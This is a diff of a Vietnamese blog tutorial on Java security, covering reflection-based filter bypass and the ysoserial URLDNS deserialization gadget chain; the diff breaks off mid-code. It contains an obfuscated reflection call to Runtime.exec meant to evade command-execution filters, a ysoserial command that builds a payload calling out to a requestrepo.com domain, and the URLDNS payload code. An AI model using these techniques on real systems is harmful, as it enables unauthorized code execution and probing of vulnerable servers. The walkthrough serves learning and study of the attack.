@@ -10,7 +10,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
 
   <title>Java security - &gt; root@l3mnt2010:~# ./exploit.py</title>
-  <meta name="description" content="java security Chào mọi người, đây là series học javasec của mình từ việc theo dõi blog của anh tsug0d
+  <meta name="description" content="Chào mọi người, đây là series học javasec của mình từ việc theo dõi blog của anh tsug0d và anh Jang.
 Cài đặt môi trường:
  IntelliJ - ide để chạy và debug java java enviroment để chạy java  Mở ide -&gt; tạo project mới -&gt; gen ra:
 ở trên là cấu trúc cây thư mục của 1 dự án java spring boot web cơ bản theo mô hình mvc flow từ controller -&gt; service -&gt; view để tương tác với người dùng.">
@@ -62,9 +62,9 @@ Cài đặt môi trường:
     "name" : ""
   },
   "headline": "Java security",
-  "description" : "java security Chào mọi người, đây là series học javasec của mình từ việc theo dõi blog của anh tsug0d\nCài đặt môi trường:\n IntelliJ - ide để chạy và debug java java enviroment để chạy java  Mở ide -\u0026gt; tạo project mới -\u0026gt; gen ra:\nở trên là cấu trúc cây thư mục của 1 dự án java spring boot web cơ bản theo mô hình mvc flow từ controller -\u0026gt; service -\u0026gt; view để tương tác với người dùng.",
+  "description" : "Chào mọi người, đây là series học javasec của mình từ việc theo dõi blog của anh tsug0d và anh Jang.\nCài đặt môi trường:\n IntelliJ - ide để chạy và debug java java enviroment để chạy java  Mở ide -\u0026gt; tạo project mới -\u0026gt; gen ra:\nở trên là cấu trúc cây thư mục của 1 dự án java spring boot web cơ bản theo mô hình mvc flow từ controller -\u0026gt; service -\u0026gt; view để tương tác với người dùng.",
   "inLanguage" : "en",
-  "wordCount":  5765 ,
+  "wordCount":  5766 ,
   "datePublished" : "0001-01-01T00:00:00\u002b00:00",
   "dateModified" : "0001-01-01T00:00:00\u002b00:00",
   "image" : "https:\/\/l3mnt2010.github.io\/avatar.png",
@@ -85,7 +85,7 @@ Cài đặt môi trường:
 
 
 <meta property="og:title" content="Java security" />
-<meta property="og:description" content="java security Chào mọi người, đây là series học javasec của mình từ việc theo dõi blog của anh tsug0d
+<meta property="og:description" content="Chào mọi người, đây là series học javasec của mình từ việc theo dõi blog của anh tsug0d và anh Jang.
 Cài đặt môi trường:
  IntelliJ - ide để chạy và debug java java enviroment để chạy java  Mở ide -&gt; tạo project mới -&gt; gen ra:
 ở trên là cấu trúc cây thư mục của 1 dự án java spring boot web cơ bản theo mô hình mvc flow từ controller -&gt; service -&gt; view để tương tác với người dùng.">
@@ -95,7 +95,7 @@ Cài đặt môi trường:
 <meta property="og:site_name" content="&gt; root@l3mnt2010:~# ./exploit.py" />
 
   <meta name="twitter:title" content="Java security" />
-  <meta name="twitter:description" content="java security Chào mọi người, đây là series học javasec của mình từ việc theo dõi blog của anh tsug0d
+  <meta name="twitter:description" content="Chào mọi người, đây là series học javasec của mình từ việc theo dõi blog của anh tsug0d và anh Jang.
 Cài đặt môi trường:
  IntelliJ - ide để chạy và debug java java enviroment để chạy java  Mở ide …">
   <meta name="twitter:image" content="https://l3mnt2010.github.io/avatar.png" />
@@ -129,7 +129,7 @@ Cài đặt môi trường:
         
           
             <li>
-              <a title="Posts" href="https://l3mnt2010.github.io/post">Posts</a>
+              <a title="Posts" href="https://l3mnt2010.github.io/posts">Posts</a>
             </li>
           
         
@@ -271,8 +271,7 @@ Cài đặt môi trường:
     <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
       <article role="main" class="blog-post">
         <!-- raw HTML omitted -->
-<h1 id="java-security">java security</h1>
-<p>Chào mọi người, đây là series học javasec của mình từ việc theo dõi blog của anh tsug0d</p>
+<p>Chào mọi người, đây là series học javasec của mình từ việc theo dõi blog của anh tsug0d và anh Jang.</p>
 <p>Cài đặt môi trường:</p>
 <ul>
 <li>IntelliJ - ide để chạy và debug java</li>
@@ -287,33 +286,33 @@ Cài đặt môi trường:
 <p>Trong security thì java reflection được dùng để bypass filter/sanbox hay dỳng để lấy và thay đổi các giá trị của các field của gadget chain trong bug java deserialization.</p>
 <p>#1.1 Bypass filter</p>
 <p>Ví dụ ta có một target có thể eval các code java nhập vào thông thường sẽ gọi Runtime.getRuntime().exec(cmd) để chạy lệnh như dưới đây:</p>
-<pre><code>public String demoVul(){
-        System.out.println(&quot;Every seem ok!!!&quot;);
-        try {
-            // Process process = Runtime.getRuntime().exec(&quot;whoami&quot;);
-            Process process = (Process) String.class.getClass()
-                    .forName(&quot;java.l&quot; + &quot;ang.Ru&quot; + &quot;ntime&quot;)
-                    .getMethod(&quot;exe&quot; + &quot;c&quot;, String.class)
-                    .invoke(
-                            String.class.getClass()
-                                    .forName(&quot;java.l&quot; + &quot;ang.Ru&quot; + &quot;ntime&quot;)
-                                    .getMethod(&quot;getRu&quot; + &quot;ntime&quot;)
-                                    .invoke(
-                                            String.class.getClass()
-                                                    .forName(&quot;java.l&quot; + &quot;ang.Ru&quot; + &quot;ntime&quot;)),
-                            &quot;whoami&quot;);
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="n">String</span> <span class="nf">demoVul</span><span class="o">(){</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;Every seem ok!!!&#34;</span><span class="o">);</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="c1">// Process process = Runtime.getRuntime().exec(&#34;whoami&#34;);
+</span><span class="c1"></span>            <span class="n">Process</span> <span class="n">process</span> <span class="o">=</span> <span class="o">(</span><span class="n">Process</span><span class="o">)</span> <span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getClass</span><span class="o">()</span>
+                    <span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;java.l&#34;</span> <span class="o">+</span> <span class="s">&#34;ang.Ru&#34;</span> <span class="o">+</span> <span class="s">&#34;ntime&#34;</span><span class="o">)</span>
+                    <span class="o">.</span><span class="na">getMethod</span><span class="o">(</span><span class="s">&#34;exe&#34;</span> <span class="o">+</span> <span class="s">&#34;c&#34;</span><span class="o">,</span> <span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">)</span>
+                    <span class="o">.</span><span class="na">invoke</span><span class="o">(</span>
+                            <span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getClass</span><span class="o">()</span>
+                                    <span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;java.l&#34;</span> <span class="o">+</span> <span class="s">&#34;ang.Ru&#34;</span> <span class="o">+</span> <span class="s">&#34;ntime&#34;</span><span class="o">)</span>
+                                    <span class="o">.</span><span class="na">getMethod</span><span class="o">(</span><span class="s">&#34;getRu&#34;</span> <span class="o">+</span> <span class="s">&#34;ntime&#34;</span><span class="o">)</span>
+                                    <span class="o">.</span><span class="na">invoke</span><span class="o">(</span>
+                                            <span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getClass</span><span class="o">()</span>
+                                                    <span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;java.l&#34;</span> <span class="o">+</span> <span class="s">&#34;ang.Ru&#34;</span> <span class="o">+</span> <span class="s">&#34;ntime&#34;</span><span class="o">)),</span>
+                            <span class="s">&#34;whoami&#34;</span><span class="o">);</span>
 
-            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
-            System.out.println(reader.readLine());
+            <span class="n">BufferedReader</span> <span class="n">reader</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BufferedReader</span><span class="o">(</span><span class="k">new</span> <span class="n">InputStreamReader</span><span class="o">(</span><span class="n">process</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">()));</span>
+            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">reader</span><span class="o">.</span><span class="na">readLine</span><span class="o">());</span>
 
-        } catch (ClassNotFoundException | NoSuchMethodException | InvocationTargetException | IllegalAccessException |
-                 IOException e) {
-            e.printStackTrace();
-        }
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">ClassNotFoundException</span> <span class="o">|</span> <span class="n">NoSuchMethodException</span> <span class="o">|</span> <span class="n">InvocationTargetException</span> <span class="o">|</span> <span class="n">IllegalAccessException</span> <span class="o">|</span>
+                 <span class="n">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span>
 
-        return &quot;OK&quot;;
-    }
-</code></pre><p>Đoạn code trên -&gt; chỉ kể đến đoạn comment thì chỉ đơn giản là chạy và in ra kết quả của whoami cmd</p>
+        <span class="k">return</span> <span class="s">&#34;OK&#34;</span><span class="o">;</span>
+    <span class="o">}</span>
+</code></pre></div><p>Đoạn code trên -&gt; chỉ kể đến đoạn comment thì chỉ đơn giản là chạy và in ra kết quả của whoami cmd</p>
 <p>Nếu Runtime exec bị chặn thì sao -&gt; ta sẽ dùng các method khác nhưng nếu Runtime exec đã bị chặn thì các hàm liên quan cũng hầu hết chết -&gt; lúc này ta sẽ dùng java reflection</p>
 <p>Như ở đoạn code trên ta có thể thấy ta sẽ dùng các reflection API, như getClass(), getMethod(), forName() và invoke()</p>
 <p>Chú ý: java.lang.Class là một entrypoint của mọi thao tác reflection Api hiểu nôm na nó là cội nguồn của mọi class nằm trong java -&gt; tất cả class đều có liên quan đến nó</p>
@@ -329,66 +328,66 @@ Cài đặt môi trường:
 <h2 id="option1-urldns">Option1 URLDNS</h2>
 <p>genpayload: <code>java -jar ysoserial-all.jar URLDNS &quot;http://e3t352l0.requestrepo.com&quot; | base64 -w0</code></p>
 <p>Chain này bao gồm các thành phần như sau:</p>
-<pre><code>  HashMap.readObject()
-    HashMap.hash()
-      URL.hashCode()
-        URLStreamHandler.hashCode()
-          URLStreamHandler.getHostAddress()
-            InetAddress.getByName()
-</code></pre><p>Gadget chain này tồn tại bên trong runtime.jar của java -&gt; mục đích cuối cùng của nó là tạo 1 request dns lookup tới domain tùy úy -&gt; kiểm tra xem targer có thể deserialize obj này được hay không</p>
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java">  <span class="n">HashMap</span><span class="o">.</span><span class="na">readObject</span><span class="o">()</span>
+    <span class="n">HashMap</span><span class="o">.</span><span class="na">hash</span><span class="o">()</span>
+      <span class="n">URL</span><span class="o">.</span><span class="na">hashCode</span><span class="o">()</span>
+        <span class="n">URLStreamHandler</span><span class="o">.</span><span class="na">hashCode</span><span class="o">()</span>
+          <span class="n">URLStreamHandler</span><span class="o">.</span><span class="na">getHostAddress</span><span class="o">()</span>
+            <span class="n">InetAddress</span><span class="o">.</span><span class="na">getByName</span><span class="o">()</span>
+</code></pre></div><p>Gadget chain này tồn tại bên trong runtime.jar của java -&gt; mục đích cuối cùng của nó là tạo 1 request dns lookup tới domain tùy úy -&gt; kiểm tra xem targer có thể deserialize obj này được hay không</p>
 <ul>
 <li>Tiến hành tìm hiểu các gadget chain -&gt; ta sẽ chọn HashMap.java</li>
 </ul>
 <p><img src="https://hackmd.io/_uploads/rJxihKThA.png" alt="image"></p>
 <p>-&gt; tìm đến method readObject</p>
-<pre><code>private void readObject(ObjectInputStream s)
-        throws IOException, ClassNotFoundException {
-        reinitialize();
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="kd">private</span> <span class="kt">void</span> <span class="nf">readObject</span><span class="o">(</span><span class="n">ObjectInputStream</span> <span class="n">s</span><span class="o">)</span>
+        <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">ClassNotFoundException</span> <span class="o">{</span>
+        <span class="n">reinitialize</span><span class="o">();</span>
 
-        ObjectInputStream.GetField fields = s.readFields();
+        <span class="n">ObjectInputStream</span><span class="o">.</span><span class="na">GetField</span> <span class="n">fields</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="na">readFields</span><span class="o">();</span>
 
-        // Read loadFactor (ignore threshold)
-        float lf = fields.get(&quot;loadFactor&quot;, 0.75f);
-        if (lf &lt;= 0 || Float.isNaN(lf))
-            throw new InvalidObjectException(&quot;Illegal load factor: &quot; + lf);
+        <span class="c1">// Read loadFactor (ignore threshold)
+</span><span class="c1"></span>        <span class="kt">float</span> <span class="n">lf</span> <span class="o">=</span> <span class="n">fields</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">&#34;loadFactor&#34;</span><span class="o">,</span> <span class="n">0</span><span class="o">.</span><span class="na">75f</span><span class="o">);</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">lf</span> <span class="o">&lt;=</span> <span class="n">0</span> <span class="o">||</span> <span class="n">Float</span><span class="o">.</span><span class="na">isNaN</span><span class="o">(</span><span class="n">lf</span><span class="o">))</span>
+            <span class="k">throw</span> <span class="k">new</span> <span class="n">InvalidObjectException</span><span class="o">(</span><span class="s">&#34;Illegal load factor: &#34;</span> <span class="o">+</span> <span class="n">lf</span><span class="o">);</span>
 
-        lf = Math.min(Math.max(0.25f, lf), 4.0f);
-        HashMap.UnsafeHolder.putLoadFactor(this, lf);
+        <span class="n">lf</span> <span class="o">=</span> <span class="n">Math</span><span class="o">.</span><span class="na">min</span><span class="o">(</span><span class="n">Math</span><span class="o">.</span><span class="na">max</span><span class="o">(</span><span class="n">0</span><span class="o">.</span><span class="na">25f</span><span class="o">,</span> <span class="n">lf</span><span class="o">),</span> <span class="n">4</span><span class="o">.</span><span class="na">0f</span><span class="o">);</span>
+        <span class="n">HashMap</span><span class="o">.</span><span class="na">UnsafeHolder</span><span class="o">.</span><span class="na">putLoadFactor</span><span class="o">(</span><span class="k">this</span><span class="o">,</span> <span class="n">lf</span><span class="o">);</span>
 
-        s.readInt();                // Read and ignore number of buckets
-        int mappings = s.readInt(); // Read number of mappings (size)
-        if (mappings &lt; 0) {
-            throw new InvalidObjectException(&quot;Illegal mappings count: &quot; + mappings);
-        } else if (mappings == 0) {
-            // use defaults
-        } else if (mappings &gt; 0) {
-            float fc = (float)mappings / lf + 1.0f;
-            int cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?
-                       DEFAULT_INITIAL_CAPACITY :
-                       (fc &gt;= MAXIMUM_CAPACITY) ?
-                       MAXIMUM_CAPACITY :
-                       tableSizeFor((int)fc));
-            float ft = (float)cap * lf;
-            threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?
-                         (int)ft : Integer.MAX_VALUE);
+        <span class="n">s</span><span class="o">.</span><span class="na">readInt</span><span class="o">();</span>                <span class="c1">// Read and ignore number of buckets
+</span><span class="c1"></span>        <span class="kt">int</span> <span class="n">mappings</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="na">readInt</span><span class="o">();</span> <span class="c1">// Read number of mappings (size)
+</span><span class="c1"></span>        <span class="k">if</span> <span class="o">(</span><span class="n">mappings</span> <span class="o">&lt;</span> <span class="n">0</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">throw</span> <span class="k">new</span> <span class="n">InvalidObjectException</span><span class="o">(</span><span class="s">&#34;Illegal mappings count: &#34;</span> <span class="o">+</span> <span class="n">mappings</span><span class="o">);</span>
+        <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">mappings</span> <span class="o">==</span> <span class="n">0</span><span class="o">)</span> <span class="o">{</span>
+            <span class="c1">// use defaults
+</span><span class="c1"></span>        <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">mappings</span> <span class="o">&gt;</span> <span class="n">0</span><span class="o">)</span> <span class="o">{</span>
+            <span class="kt">float</span> <span class="n">fc</span> <span class="o">=</span> <span class="o">(</span><span class="kt">float</span><span class="o">)</span><span class="n">mappings</span> <span class="o">/</span> <span class="n">lf</span> <span class="o">+</span> <span class="n">1</span><span class="o">.</span><span class="na">0f</span><span class="o">;</span>
+            <span class="kt">int</span> <span class="n">cap</span> <span class="o">=</span> <span class="o">((</span><span class="n">fc</span> <span class="o">&lt;</span> <span class="n">DEFAULT_INITIAL_CAPACITY</span><span class="o">)</span> <span class="o">?</span>
+                       <span class="n">DEFAULT_INITIAL_CAPACITY</span> <span class="o">:</span>
+                       <span class="o">(</span><span class="n">fc</span> <span class="o">&gt;=</span> <span class="n">MAXIMUM_CAPACITY</span><span class="o">)</span> <span class="o">?</span>
+                       <span class="n">MAXIMUM_CAPACITY</span> <span class="o">:</span>
+                       <span class="n">tableSizeFor</span><span class="o">((</span><span class="kt">int</span><span class="o">)</span><span class="n">fc</span><span class="o">));</span>
+            <span class="kt">float</span> <span class="n">ft</span> <span class="o">=</span> <span class="o">(</span><span class="kt">float</span><span class="o">)</span><span class="n">cap</span> <span class="o">*</span> <span class="n">lf</span><span class="o">;</span>
+            <span class="n">threshold</span> <span class="o">=</span> <span class="o">((</span><span class="n">cap</span> <span class="o">&lt;</span> <span class="n">MAXIMUM_CAPACITY</span> <span class="o">&amp;&amp;</span> <span class="n">ft</span> <span class="o">&lt;</span> <span class="n">MAXIMUM_CAPACITY</span><span class="o">)</span> <span class="o">?</span>
+                         <span class="o">(</span><span class="kt">int</span><span class="o">)</span><span class="n">ft</span> <span class="o">:</span> <span class="n">Integer</span><span class="o">.</span><span class="na">MAX_VALUE</span><span class="o">);</span>
 
-            // Check Map.Entry[].class since it's the nearest public type to
-            // what we're actually creating.
-            SharedSecrets.getJavaObjectInputStreamAccess().checkArray(s, Map.Entry[].class, cap);
-            @SuppressWarnings({&quot;rawtypes&quot;,&quot;unchecked&quot;})
-            Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])new Node[cap];
-            table = tab;
+            <span class="c1">// Check Map.Entry[].class since it&#39;s the nearest public type to
+</span><span class="c1"></span>            <span class="c1">// what we&#39;re actually creating.
+</span><span class="c1"></span>            <span class="n">SharedSecrets</span><span class="o">.</span><span class="na">getJavaObjectInputStreamAccess</span><span class="o">().</span><span class="na">checkArray</span><span class="o">(</span><span class="n">s</span><span class="o">,</span> <span class="n">Map</span><span class="o">.</span><span class="na">Entry</span><span class="o">[].</span><span class="na">class</span><span class="o">,</span> <span class="n">cap</span><span class="o">);</span>
+            <span class="nd">@SuppressWarnings</span><span class="o">({</span><span class="s">&#34;rawtypes&#34;</span><span class="o">,</span><span class="s">&#34;unchecked&#34;</span><span class="o">})</span>
+            <span class="n">Node</span><span class="o">&lt;</span><span class="n">K</span><span class="o">,</span><span class="n">V</span><span class="o">&gt;[]</span> <span class="n">tab</span> <span class="o">=</span> <span class="o">(</span><span class="n">Node</span><span class="o">&lt;</span><span class="n">K</span><span class="o">,</span><span class="n">V</span><span class="o">&gt;[])</span><span class="k">new</span> <span class="n">Node</span><span class="o">[</span><span class="n">cap</span><span class="o">];</span>
+            <span class="n">table</span> <span class="o">=</span> <span class="n">tab</span><span class="o">;</span>
 
-            // Read the keys and values, and put the mappings in the HashMap
-            for (int i = 0; i &lt; mappings; i++) {
-                @SuppressWarnings(&quot;unchecked&quot;)
-                    K key = (K) s.readObject();
-                @SuppressWarnings(&quot;unchecked&quot;)
-                    V value = (V) s.readObject();
-                putVal(hash(key), key, value, false, false);
-            }
-        }
-</code></pre><p>-&gt; sau khi navigate đến nó ta cần tìm mã mà nó có gọi đến chain tiếp theo như ở trên ta nói là gọi đến hash() đó là putVal <code>putVal(hash(key), key, value, false, false);</code> bắt đầu đặt break point tại đây.</p>
+            <span class="c1">// Read the keys and values, and put the mappings in the HashMap
+</span><span class="c1"></span>            <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="n">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">mappings</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
+                <span class="nd">@SuppressWarnings</span><span class="o">(</span><span class="s">&#34;unchecked&#34;</span><span class="o">)</span>
+                    <span class="n">K</span> <span class="n">key</span> <span class="o">=</span> <span class="o">(</span><span class="n">K</span><span class="o">)</span> <span class="n">s</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+                <span class="nd">@SuppressWarnings</span><span class="o">(</span><span class="s">&#34;unchecked&#34;</span><span class="o">)</span>
+                    <span class="n">V</span> <span class="n">value</span> <span class="o">=</span> <span class="o">(</span><span class="n">V</span><span class="o">)</span> <span class="n">s</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+                <span class="n">putVal</span><span class="o">(</span><span class="n">hash</span><span class="o">(</span><span class="n">key</span><span class="o">),</span> <span class="n">key</span><span class="o">,</span> <span class="n">value</span><span class="o">,</span> <span class="kc">false</span><span class="o">,</span> <span class="kc">false</span><span class="o">);</span>
+            <span class="o">}</span>
+        <span class="o">}</span>
+</code></pre></div><p>-&gt; sau khi navigate đến nó ta cần tìm mã mà nó có gọi đến chain tiếp theo như ở trên ta nói là gọi đến hash() đó là putVal <code>putVal(hash(key), key, value, false, false);</code> bắt đầu đặt break point tại đây.</p>
 <p>Trước khi đó ta có thể thấy object đã được deserialize thành công và gadget chain đã dẫn đến source :</p>
 <p><img src="https://hackmd.io/_uploads/HyxDAFpnA.png" alt="image"></p>
 <p>Sau khi thực hiện run với mode debug -&gt;</p>
@@ -408,79 +407,79 @@ Cài đặt môi trường:
 <ul>
 <li>đến với mehthod hash ta có thể thấy nó xử lí như sau:</li>
 </ul>
-<pre><code> static final int hash(Object key) {
-        int h;
-        return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);
-    }
-</code></pre><p>nhận giá trị là một object key sau đó kiểm tra key == null hay không thì trả ra 0 nếu đúng còn nếu không thì nó lại trả ra <code>(h = key.hashCode()) ^ (h &gt;&gt;&gt; 16)</code> và ở đây key.hashCode() được gọi đến -&gt;</p>
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"> <span class="kd">static</span> <span class="kd">final</span> <span class="kt">int</span> <span class="nf">hash</span><span class="o">(</span><span class="n">Object</span> <span class="n">key</span><span class="o">)</span> <span class="o">{</span>
+        <span class="kt">int</span> <span class="n">h</span><span class="o">;</span>
+        <span class="k">return</span> <span class="o">(</span><span class="n">key</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">?</span> <span class="n">0</span> <span class="o">:</span> <span class="o">(</span><span class="n">h</span> <span class="o">=</span> <span class="n">key</span><span class="o">.</span><span class="na">hashCode</span><span class="o">())</span> <span class="o">^</span> <span class="o">(</span><span class="n">h</span> <span class="o">&gt;&gt;&gt;</span> <span class="n">16</span><span class="o">);</span>
+    <span class="o">}</span>
+</code></pre></div><p>nhận giá trị là một object key sau đó kiểm tra key == null hay không thì trả ra 0 nếu đúng còn nếu không thì nó lại trả ra <code>(h = key.hashCode()) ^ (h &gt;&gt;&gt; 16)</code> và ở đây key.hashCode() được gọi đến -&gt;</p>
 <p><img src="https://hackmd.io/_uploads/HkSpUqT2C.png" alt="image"></p>
 <p>Có thể thấy nó như thế này:</p>
-<pre><code>public synchronized int hashCode() {
-        if (hashCode != -1)
-            return hashCode;
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">synchronized</span> <span class="kt">int</span> <span class="nf">hashCode</span><span class="o">()</span> <span class="o">{</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">hashCode</span> <span class="o">!=</span> <span class="o">-</span><span class="n">1</span><span class="o">)</span>
+            <span class="k">return</span> <span class="n">hashCode</span><span class="o">;</span>
 
-        hashCode = handler.hashCode(this);
-        return hashCode;
-    }
-</code></pre><pre><code> private void resetState() {
-        this.protocol = null;
-        this.host = null;
-        this.port = -1;
-        this.file = null;
-        this.authority = null;
-        this.ref = null;
-        this.hashCode = -1;
-        this.handler = null;
-        this.query = null;
-        this.path = null;
-        this.userInfo = null;
-        this.tempState = null;
-    }
-</code></pre><p><code>private int hashCode = -1;</code></p>
+        <span class="n">hashCode</span> <span class="o">=</span> <span class="n">handler</span><span class="o">.</span><span class="na">hashCode</span><span class="o">(</span><span class="k">this</span><span class="o">);</span>
+        <span class="k">return</span> <span class="n">hashCode</span><span class="o">;</span>
+    <span class="o">}</span>
+</code></pre></div><div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"> <span class="kd">private</span> <span class="kt">void</span> <span class="nf">resetState</span><span class="o">()</span> <span class="o">{</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">protocol</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">host</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">port</span> <span class="o">=</span> <span class="o">-</span><span class="n">1</span><span class="o">;</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">file</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">authority</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">ref</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">hashCode</span> <span class="o">=</span> <span class="o">-</span><span class="n">1</span><span class="o">;</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">handler</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">query</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">path</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">userInfo</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">tempState</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+    <span class="o">}</span>
+</code></pre></div><p><code>private int hashCode = -1;</code></p>
 <p>Nó sẽ kiểm tra xem có giá trị hashCode nào được cache hay không -&gt; check nếu hashCode != 1 sẽ trả về luôn còn ngược lại thì gọi <code>handler.hashCode(this)</code> và để có thể chain được thì yêu cầu nó phải có giá trị bằng -1</p>
 <p>Đây là lúc ta sử dụng java Reflection để set lại giá trị private này:</p>
-<pre><code>public class URLDNS implements ObjectPayload&lt;Object&gt; {
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">URLDNS</span> <span class="kd">implements</span> <span class="n">ObjectPayload</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="o">{</span>
 
-        public Object getObject(final String url) throws Exception {
+        <span class="kd">public</span> <span class="n">Object</span> <span class="nf">getObject</span><span class="o">(</span><span class="kd">final</span> <span class="n">String</span> <span class="n">url</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
 
-                //Avoid DNS resolution during payload creation
-                //Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.
-                URLStreamHandler handler = new SilentURLStreamHandler();
+                <span class="c1">//Avoid DNS resolution during payload creation
+</span><span class="c1"></span>                <span class="c1">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.
+</span><span class="c1"></span>                <span class="n">URLStreamHandler</span> <span class="n">handler</span> <span class="o">=</span> <span class="k">new</span> <span class="n">SilentURLStreamHandler</span><span class="o">();</span>
 
-                HashMap ht = new HashMap(); // HashMap that will contain the URL
-                URL u = new URL(null, url, handler); // URL to use as the Key
-                ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.
+                <span class="n">HashMap</span> <span class="n">ht</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span> <span class="c1">// HashMap that will contain the URL
+</span><span class="c1"></span>                <span class="n">URL</span> <span class="n">u</span> <span class="o">=</span> <span class="k">new</span> <span class="n">URL</span><span class="o">(</span><span class="kc">null</span><span class="o">,</span> <span class="n">url</span><span class="o">,</span> <span class="n">handler</span><span class="o">);</span> <span class="c1">// URL to use as the Key
+</span><span class="c1"></span>                <span class="n">ht</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">u</span><span class="o">,</span> <span class="n">url</span><span class="o">);</span> <span class="c1">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.
+</span><span class="c1"></span>
+                <span class="n">Reflections</span><span class="o">.</span><span class="na">setFieldValue</span><span class="o">(</span><span class="n">u</span><span class="o">,</span> <span class="s">&#34;hashCode&#34;</span><span class="o">,</span> <span class="o">-</span><span class="n">1</span><span class="o">);</span> <span class="c1">// During the put above, the URL&#39;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.
+</span><span class="c1"></span>
+                <span class="k">return</span> <span class="n">ht</span><span class="o">;</span>
+        <span class="o">}</span>
 
-                Reflections.setFieldValue(u, &quot;hashCode&quot;, -1); // During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.
+        <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="kd">final</span> <span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+                <span class="n">PayloadRunner</span><span class="o">.</span><span class="na">run</span><span class="o">(</span><span class="n">URLDNS</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">args</span><span class="o">);</span>
+        <span class="o">}</span>
 
-                return ht;
-        }
+        <span class="cm">/**
